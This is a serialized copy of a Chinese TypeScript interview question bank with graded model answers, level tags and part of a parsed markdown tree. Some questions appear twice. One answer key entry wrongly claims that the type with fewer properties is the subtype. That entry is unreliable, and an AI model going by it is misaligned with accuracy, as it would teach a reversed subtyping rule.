}\\n};\\n</code></pre>\\n</details>\\n\\n<h2>8、如何在 TypeScript 中定义一个只读属性的接口？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 使用 readonly 关键字。例如：</li>\\n</ul>\\n<pre><code class=\\"language-ts\\">interface Person {\\n  readonly name: string;\\n}\\nlet p: Person = { name: &quot;John&quot; };\\n// p.name = &quot;Doe&quot;;  // 错误，不能修改只读属性\\n</code></pre>\\n<h2>9. 什么是TypeScript？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Typescript 是一个强类型的 JavaScript 超集，支持ES6语法，支持面向对象编程的概念，如类、接口、继承、泛型等。Typescript并不直接在浏览器上运行，需要编译器编译成纯Javascript来运行。</li>\\n</ul>\\n<h2>9. 为什么要使用 TypeScript ? TypeScript 相对于 JavaScript 的优势是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><p>增加了静态类型，可以在开发人员编写脚本时检测错误，使得代码质量更好，更健壮。</p>\\n</li>\\n<li><p>杜绝手误导致的变量名写错;</p>\\n</li>\\n<li><p>类型检查，提前发现潜在问题;</p>\\n</li>\\n<li><p>类型推断，减少代码量，提高开发效率;</p>\\n</li>\\n<li><p>支持最新的 ECMAScript 语法，比如可选链（Optional Chaining）和空值合并运算符（Nullish Coalescing Operator）;</p>\\n</li>\\n<li><p>支持面向对象编程，比如类、接口、继承、泛型等;</p>\\n</li>\\n<li><p>支持模块化开发，使得代码更加模块化、可维护、可复用。</p>\\n</li>\\n</ul>\\n<h2><code>type A = { a: number; b: string; } ，type B = { a: number; b: string; c: boolean; }</code> 请问A和B的关系是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> A是B的子类型 。因为A包含的属性a和b在B中都有，且B还额外包含c属性 。</li>\\n</ul>\\n<h2>定义一个泛型函数 <code>add&lt;T&gt;(a: T, b: T): T</code>，该函数返回 a 和 b相加的值（假设 T类型支持加法运算）。请问<code>add&lt;number&gt;(1, 2)</code>返回值类型是什么</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 返回值类型是 number。因为 add函数传入的类型参数 T为 number，add函数返回值类型就是 number。</li>\\n</ul>\\n<h2><code>type MyType = string | number | null | undefined ，type Result = NonNullable&lt;MyType&gt;</code> 请问Result类型是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> Result类型是 string | number 。因为NonNullable会排除null和undefined 。</li>\\n</ul>\\n<h2>如何在TypeScript中实现函数重载？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n        return a + b;\\n    }\\n    if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n        return a.concat(b);\\n    }\\n    throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(&quot;Hello &quot;, &quot;World&quot;)); // &quot;Hello World&quot;\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 在类中使用函数重载：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n            return a + b;\\n        }\\n        if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n            return a.concat(b);\\n        }\\n        throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n    }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>TypeScript中的装饰器是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。</p>\\n</li>\\n<li><p><strong>4：</strong> 常见的装饰器类型：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 类装饰器\\nfunction classDecorator&lt;T extends {new(...args:any[]):{}}&gt;(constructor:T) {\\n    return class extends constructor {\\n        newProperty = &quot;new property&quot;;\\n        hello = &quot;override&quot;;\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(&#39;Before method execution&#39;);\\n        const result = originalMethod.apply(this, args);\\n        console.log(&#39;After method execution&#39;);\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(&#39;Hello!&#39;);\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n</code></pre>\\n</details>\\n\\n<h2>TypeScript中的映射类型是什么？请举例说明</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。</p>\\n</li>\\n<li><p><strong>2：</strong> 示例：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable&lt;T&gt; = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n</code></pre>\\n</details>\\n\\n<h2>如何在TypeScript中实现函数重载？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><strong>2：</strong> 函数重载允许一个函数接受不同数量或类型的参数时，作出不同的处理。在TypeScript中，我们需要先声明所有重载的函数签名，然后再实现一个通用的函数：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 重载签名\\nfunction add(a: number, b: number): number;\\nfunction add(a: string, b: string): string;\\n\\n// 实现签名\\nfunction add(a: number | string, b: number | string): number | string {\\n    if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n        return a + b;\\n    }\\n    if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n        return a.concat(b);\\n    }\\n    throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n}\\n\\nconsole.log(add(1, 2));          // 3\\nconsole.log(add(&quot;Hello &quot;, &quot;World&quot;)); // &quot;Hello World&quot;\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 在类中使用函数重载：</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">class Calculator {\\n    add(a: number, b: number): number;\\n    add(a: string, b: string): string;\\n    add(a: any, b: any): any {\\n        if (typeof a === &#39;number&#39; &amp;&amp; typeof b === &#39;number&#39;) {\\n            return a + b;\\n        }\\n        if (typeof a === &#39;string&#39; &amp;&amp; typeof b === &#39;string&#39;) {\\n            return a.concat(b);\\n        }\\n        throw new Error(&#39;Parameters must be numbers or strings&#39;);\\n    }\\n}\\n</code></pre>\\n</details>\\n\\n<h2>TypeScript中的装饰器是什么？如何使用？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（6 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。</p>\\n</li>\\n<li><p><strong>4：</strong> 常见的装饰器类型：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 类装饰器\\nfunction classDecorator&lt;T extends {new(...args:any[]):{}}&gt;(constructor:T) {\\n    return class extends constructor {\\n        newProperty = &quot;new property&quot;;\\n        hello = &quot;override&quot;;\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(&#39;Before method execution&#39;);\\n        const result = originalMethod.apply(this, args);\\n        console.log(&#39;After method execution&#39;);\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(&#39;Hello!&#39;);\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n</code></pre>\\n</details>\\n\\n<h2>TypeScript中的映射类型是什么？</h2>\\n<h4>类型：<code>基础</code></h4>\\n<h4>级别：<code>W1</code>、<code>W2</code>、<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<details>\\n\\n<ul>\\n<li><p><strong>2：</strong> 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。</p>\\n</li>\\n<li><p><strong>2：</strong> 示例：</p>\\n</li>\\n</ul>\\n<pre><code class=\\"language-typescript\\">// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable&lt;T&gt; = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable&lt;Person&gt;;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n</code></pre>\\n</details>","ast":[{"type":"heading","raw":"# TypeScript\\n\\n","depth":1,"text":"TypeScript","tokens":[{"type":"text","raw":"TypeScript","text":"TypeScript","escaped":false}]},{"type":"heading","raw":"## ts 如何定义对象结构体\\n\\n","depth":2,"text":"ts 如何定义对象结构体","tokens":[{"type":"text","raw":"ts 如何定义对象结构体","text":"ts 如何定义对象结构体","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","task":false,"loose":false,"text":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","tokens":[{"type":"text","raw":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","text":"**1：** 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","text":" 接口（interface）用于定义更复杂或重复使用的对象类型。接口不仅可以用于定义对象结构，还能继承、扩展其他接口。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\ninterface Person {\\n    name: string;\\n    age: number;\\n}\\n```","lang":"typescript","text":"interface Person {\\n    name: string;\\n    age: number;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"list","raw":"- **1：** type 也可以用于定义类型","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** type 也可以用于定义类型","task":false,"loose":false,"text":"**1：** type 也可以用于定义类型","tokens":[{"type":"text","raw":"**1：** type 也可以用于定义类型","text":"**1：** type 也可以用于定义类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" type 也可以用于定义类型","text":" type 也可以用于定义类型","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\ntype Person = {\\n    name: string;\\n    age: number;\\n}\\n```","lang":"typescript","text":"type Person = {\\n    name: string;\\n    age: number;\\n}"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## type 和 interface的区别？\\n\\n","depth":2,"text":"type 和 interface的区别？","tokens":[{"type":"text","raw":"type 和 interface的区别？","text":"type 和 interface的区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** interface 可以重复声明，type 不行\\n- **1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好\\n- 建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** interface 可以重复声明，type 不行\\n","task":false,"loose":false,"text":"**1：** interface 可以重复声明，type 不行","tokens":[{"type":"text","raw":"**1：** interface 可以重复声明，type 不行","text":"**1：** interface 可以重复声明，type 不行","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" interface 可以重复声明，type 不行","text":" interface 可以重复声明，type 不行","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好\\n","task":false,"loose":false,"text":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","tokens":[{"type":"text","raw":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","text":"**1：** 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","text":" 继承方式不一样，type 使用交叉类型方式，interface使用extends实现，在对象扩展的情况下，使用接口继承要比交叉类型的性能更好","escaped":false}]}]},{"type":"list_item","raw":"- 建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","task":false,"loose":false,"text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","tokens":[{"type":"text","raw":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","tokens":[{"type":"text","raw":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","text":"建议使用interface来描述对象对外暴露的借口，使用type将一组类型重命名（或对类型进行复杂编程）。","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## 常用工具类型？\\n\\n","depth":2,"text":"常用工具类型？","tokens":[{"type":"text","raw":"常用工具类型？","text":"常用工具类型？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（7 分）\\n\\n","depth":4,"text":"解答（7 分）","tokens":[{"type":"text","raw":"解答（7 分）","text":"解答（7 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** Partial：满足部分属性(一个都没满足也可)即可\\n- **1：** Required：所有属性都需要\\n- **1：** Readonly: 包装后的所有属性只读\\n- **1：** Pick: 选取部分属性\\n- **1：** Omit: 去除部分属性\\n- **1：** Extract: 交集\\n- **1：** Exclude: 差集","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Partial：满足部分属性(一个都没满足也可)即可\\n","task":false,"loose":false,"text":"**1：** Partial：满足部分属性(一个都没满足也可)即可","tokens":[{"type":"text","raw":"**1：** Partial：满足部分属性(一个都没满足也可)即可","text":"**1：** Partial：满足部分属性(一个都没满足也可)即可","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Partial：满足部分属性(一个都没满足也可)即可","text":" Partial：满足部分属性(一个都没满足也可)即可","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Required：所有属性都需要\\n","task":false,"loose":false,"text":"**1：** Required：所有属性都需要","tokens":[{"type":"text","raw":"**1：** Required：所有属性都需要","text":"**1：** Required：所有属性都需要","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Required：所有属性都需要","text":" Required：所有属性都需要","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Readonly: 包装后的所有属性只读\\n","task":false,"loose":false,"text":"**1：** Readonly: 包装后的所有属性只读","tokens":[{"type":"text","raw":"**1：** Readonly: 包装后的所有属性只读","text":"**1：** Readonly: 包装后的所有属性只读","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Readonly: 包装后的所有属性只读","text":" Readonly: 包装后的所有属性只读","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Pick: 选取部分属性\\n","task":false,"loose":false,"text":"**1：** Pick: 选取部分属性","tokens":[{"type":"text","raw":"**1：** Pick: 选取部分属性","text":"**1：** Pick: 选取部分属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Pick: 选取部分属性","text":" Pick: 选取部分属性","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Omit: 去除部分属性\\n","task":false,"loose":false,"text":"**1：** Omit: 去除部分属性","tokens":[{"type":"text","raw":"**1：** Omit: 去除部分属性","text":"**1：** Omit: 去除部分属性","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Omit: 去除部分属性","text":" Omit: 去除部分属性","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Extract: 交集\\n","task":false,"loose":false,"text":"**1：** Extract: 交集","tokens":[{"type":"text","raw":"**1：** Extract: 交集","text":"**1：** Extract: 交集","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Extract: 交集","text":" Extract: 交集","escaped":false}]}]},{"type":"list_item","raw":"- **1：** Exclude: 差集","task":false,"loose":false,"text":"**1：** Exclude: 差集","tokens":[{"type":"text","raw":"**1：** Exclude: 差集","text":"**1：** Exclude: 差集","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Exclude: 差集","text":" Exclude: 差集","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## any、never、unknown、null & undefined 和 void 有什么区别？\\n\\n","depth":2,"text":"any、never、unknown、null & undefined 和 void 有什么区别？","tokens":[{"type":"text","raw":"any、never、unknown、null & undefined 和 void 有什么区别？","text":"any、never、unknown、null & undefined 和 void 有什么区别？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（5 分）\\n\\n","depth":4,"text":"解答（5 分）","tokens":[{"type":"text","raw":"解答（5 分）","text":"解答（5 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **1：** any: 动态的变量类型（失去了类型检查的作用）\\n- **1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型\\n- **1：** unknown: 任何类型的值都可以赋给 unknown 类型，但是 unknown 类型的值只能赋给 unknown 本身和 any 类型\\n- **1：** null & undefined: 默认情况下 null 和 undefined 是所有类型的子类型。 就是说你可以把 null 和 undefined 赋值给 number 类型的变量。当你指定了 --strictNullChecks 标记，null 和 undefined 只能赋值给 void 和它们各自\\n- **1：** void: 没有任何类型。例如：一个函数如果没有返回值，那么返回值可以定义为void","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** any: 动态的变量类型（失去了类型检查的作用）\\n","task":false,"loose":false,"text":"**1：** any: 动态的变量类型（失去了类型检查的作用）","tokens":[{"type":"text","raw":"**1：** any: 动态的变量类型（失去了类型检查的作用）","text":"**1：** any: 动态的变量类型（失去了类型检查的作用）","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" any: 动态的变量类型（失去了类型检查的作用）","text":" any: 动态的变量类型（失去了类型检查的作用）","escaped":false}]}]},{"type":"list_item","raw":"- **1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型\\n","task":false,"loose":false,"text":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","tokens":[{"type":"text","raw":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","text":"**1：** never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" never: 永不存在的值的类型。例如：never 类型是那些总是会抛出异常或根本就不会有返回值的函数表达式或箭头函数表达式的返回值类型","text":" never: 永不存在的值的类型。例如：never 